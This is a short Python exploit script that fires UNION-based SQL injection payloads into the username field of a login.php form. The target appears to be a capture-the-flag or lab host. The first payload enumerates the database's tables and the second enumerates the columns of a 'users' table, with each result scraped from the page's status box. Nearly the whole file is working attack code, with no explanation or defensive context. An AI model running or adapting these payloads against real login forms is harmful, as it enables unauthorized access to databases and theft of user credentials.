import requests, re

BASE = "http://6033bc60-27f0-4b34-aef3-14d892d241b2.red.cyberkent.uz"

def try_login(username, password="x"):
    r = requests.post(f"{BASE}/login.php", data={"username": username, "password": password}, timeout=10)
    m = re.search(r'<div class="status-box">(.*?)</div>', r.text, re.S)
    status = m.group(1) if m else "(no status box)"
    err = re.search(r'<div class="error-box">(.*?)</div>', r.text, re.S)
    err_text = err.group(1) if err else "(NO ERROR BOX - LOGGED IN?)"
    return status, err_text, r

# 1. list tables
payload = "zzznouser' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"
status, err, r = try_login(payload)
print("TABLES:", status)

# 2. columns of users table (guess table name 'users')
payload = "zzznouser' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -"
status, err, r = try_login(payload)
print("USERS COLUMNS:", status)
